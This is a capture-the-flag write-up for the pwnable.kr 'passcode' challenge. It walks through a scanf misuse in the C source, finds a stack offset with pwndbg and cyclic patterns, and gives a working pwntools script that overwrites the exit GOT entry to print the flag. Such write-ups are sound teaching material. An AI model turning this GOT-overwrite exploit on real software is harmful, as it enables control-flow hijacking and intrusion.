## Description
passcode - 10 pt [writeup]

> Mommy told me to make a passcode based login system.
> My initial C code was compiled without any error!
> Well, there was some compiler warning, but who cares about that?
>
> ssh passcode@pwnable.kr -p2222 (pw:guest)

## Solution
We are given a binary file `passcode`, and it's source code `passcode.c`.
Firstly, let's check the security of the binary:
```shell
$ file passcode
passcode: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, .... , not stripped
$ checksec --file=passcode
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH     Symbols          FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   74) Symbols       No    0               1             passcode
```
Let's take a look at the source code:
### passcode.c
```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```
As we can see, the program is checking two passcodes, `passcode1` and `passcode2`.\
`passcode1` should be `338150`, and `passcode2` should be `13371337`.\
If both passcodes are correct, the program will print the flag.

But if we look close at the lines that gets the values of `passcode1` and `passcode2`, we can see that there is a problem.
Instead of using `scanf("%d", &passcode1)`, the program uses `scanf("%d", passcode1)`.\
This means that the program will try to write a value which we control to the address `passcode1`, which is the actual value of `passcode1` and not the address of `passcode1`.\
The same goes for `passcode2`.

Therefor, we can't just pass the values `338150` and `13371337` to the program, because the program will not write them to the addresses of `passcode1` and `passcode2`, but to the values of `passcode1` and `passcode2`, which are not initialized yet.\

So we need to find a way to bypass the check of `passcode1` and `passcode2`, and some how print the flag.

We are going to use a technique called GOT overwrite, to hijack the program flow and print the flag.
Notice that the binary was compiled with only partial RELRO enabled, which means that this attack is possible.

Let's take a look at the binary file using `pwndbg`
```shell
$ gdb ./passcode
pwndbg> disassemble login
pwndbg> disassemble login
Dump of assembler code for function login:
   ....
   0x08048572 <+14>:    call   0x8048420 <printf@plt> # printf("enter passcode1 : ");
   0x08048577 <+19>:    mov    eax,0x8048783 # "%d"
   0x0804857c <+24>:    mov    edx,DWORD PTR [ebp-0x10] # passcode1
   0x0804857f <+27>:    mov    DWORD PTR [esp+0x4],edx
   0x08048583 <+31>:    mov    DWORD PTR [esp],eax
   0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt> # scanf("%d", passcode1);
   0x0804858b <+39>:    mov    eax,ds:0x804a02c
   0x08048590 <+44>:    mov    DWORD PTR [esp],eax
   0x08048593 <+47>:    call   0x8048430 <fflush@plt> # fflush(stdin);
   0x08048598 <+52>:    mov    eax,0x8048786 # "enter passcode2 : "
   0x0804859d <+57>:    mov    DWORD PTR [esp],eax
   0x080485a0 <+60>:    call   0x8048420 <printf@plt> # printf("enter passcode2 : ");
   0x080485a5 <+65>:    mov    eax,0x8048783 # "%d"
   0x080485aa <+70>:    mov    edx,DWORD PTR [ebp-0xc] # passcode2
   0x080485ad <+73>:    mov    DWORD PTR [esp+0x4],edx
   0x080485b1 <+77>:    mov    DWORD PTR [esp],eax
   0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt> # scanf("%d", passcode2);
   0x080485b9 <+85>:    mov    DWORD PTR [esp],0x8048799 # "checking..."
   0x080485c0 <+92>:    call   0x8048450 <puts@plt> # puts("checking...");
   0x080485c5 <+97>:    cmp    DWORD PTR [ebp-0x10],0x528e6 # passcode1 == (0x528e6 = 338150)
   0x080485cc <+104>:   jne    0x80485f1 <login+141> # if passcode1 != 338150, jump to 0x080485f1
   0x080485ce <+106>:   cmp    DWORD PTR [ebp-0xc],0xcc07c9 # passcode2 == (0xcc07c9 = 13371337)
   0x080485d5 <+113>:   jne    0x80485f1 <login+141> # if passcode2 != 13371337, jump to 0x080485f1
   # ==== The big W section ====
   0x080485d7 <+115>:   mov    DWORD PTR [esp],0x80487a5 # "Login OK!"
   0x080485de <+122>:   call   0x8048450 <puts@plt> # puts("Login OK!");
   0x080485e3 <+127>:   mov    DWORD PTR [esp],0x80487af # "/bin/cat flag"
   0x080485ea <+134>:   call   0x8048460 <system@plt> # system("/bin/cat flag");
   0x080485ef <+139>:   leave  
   0x080485f0 <+140>:   ret    
   # ==== The loser section ====
   0x080485f1 <+141>:   mov    DWORD PTR [esp],0x80487bd # "Login Failed!"
   0x080485f8 <+148>:   call   0x8048450 <puts@plt> # puts("Login Failed!");
   0x080485fd <+153>:   mov    DWORD PTR [esp],0x0
   0x08048604 <+160>:   call   0x8048480 <exit@plt> # exit(0);
End of assembler dump.
```

`passcode1` is stored at `ebp-0x10`, `passcode2` is stored at `ebp-0xc`.
Now let's see if we can control the initial values of `passcode1` and `passcode2`.
```shell
>>> cyclic(120)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab'
```
```shell
pwndbg> b login
Breakpoint 1 at 0x804856a
pwndbg> r
enter you name : aaaabaaacaaadaaaeaaafaaaga....eaab
....
Breakpoint 1, 0x0804856a in login ()
pwndbg> x/w $ebp-0x10
0xffff32f8:     0x61616179
pwndbg> x/w $ebp-0xc
0xffff32fc:     0xe8d3ec00
```
```shell
>>> cyclic_find(0x61616179)
96
```
As we can see, the 4 last bytes of `char name[100]` are the initial bytes of `passcode1`.
Meaning we have full control over the initial value of `passcode1` but not of `passcode2`. So we can't change both to pass the `if` statement.
But we can set `passcode1` to an address that we want to change in the GOT table, and then use the call to `scanf("%d", passcode1)` to overwrite that GOT entry with the address of `system("/bin/cat flag")`.

Now let's find ourselves a GOT entry to overwrite.
First we can try `scanf`:
```shell
....
call   0x80484a0 <__isoc99_scanf@plt>
....

pwndbg> disassemble 0x80484a0
Dump of assembler code for function __isoc99_scanf@plt:
   0x080484a0 <+0>:	jmp    DWORD PTR ds:0x804a020
   0x080484a6 <+6>:	push   0x40
   0x080484ab <+11>:	jmp    0x8048410
End of assembler dump.
```
So we can try and overwrite the GOT entry of `scanf`, which is at `0x804a020`.
But notice that the `0x20` is the space character, so we can't use it in our payload.
So we'll have to find another GOT entry to overwrite.

Let's try `printf`:
```shell
....
call   0x8048420 <printf@plt>
....

pwndbg> disassemble 0x8048420
Dump of assembler code for function printf@plt:
   0x08048420 <+0>:     jmp    DWORD PTR ds:0x804a000
   0x08048426 <+6>:     push   0x0
   0x0804842b <+11>:    jmp    0x8048410
End of assembler dump.
```
It's at `0x804a000`, we can't use it either because of the `0x00` byte.

At last, let's try `exit`:
```shell
....
call   0x8048480 <exit@plt>
....
pwndbg> disassemble 0x8048480
Dump of assembler code for function exit@plt:
   0x08048480 <+0>:     jmp    DWORD PTR ds:0x804a018
   0x08048486 <+6>:     push   0x30
   0x0804848b <+11>:    jmp    0x8048410
End of assembler dump.
```
It's at `0x804a018`, and we can use it!

Now let's choose the address we want to write in the GOT entry. We'll use `0x080485d7`, which is the address of the `mov    DWORD PTR [esp],0x80487a5 # "Login OK!"` instruction.

Let's write our exploit:
```python
#!/usr/bin/env python3

from pwn import *

context.log_level = 'debug'

shell = ssh('passcode', 'pwnable.kr', password='guest', port=2222)
p = shell.process('./passcode')

p.recvuntil("enter you name : ")
payload = b'L' * 96 + p32(0x804a018) # 96 bytes of 'L' + address of GOT entry of exit
p.sendline(payload)
p.recvuntil("enter passcode1 : ")
p.sendline(f"{0x080485d7}") # address of "Login OK!" instruction
p.recvuntil("enter passcode2 : ")
p.sendline(b"l")

p.interactive()
```
Run it:
```shell
$ ./exploit.py 
[+] Connecting to pwnable.kr on port 2222: Done
....
[*] Switching to interactive mode
checking...
Login Failed!
Login OK!
[ ...FLAG... ]
Now I can safely trust you that you have credential :)
[*] Got EOF while reading in interactive
```
and we got the flag!

So to sum up, we used an uninitialized variable which we had control of and a bad call to `scanf` to overwrite the GOT entry of `exit` with the address of an instruction we wanted, which led to the call `system("/bin/cat flag")`.

Awesome!

## Setup
```shell
mkdir passcode && scp -P2222 passcode@pwnable.kr:* passcode
```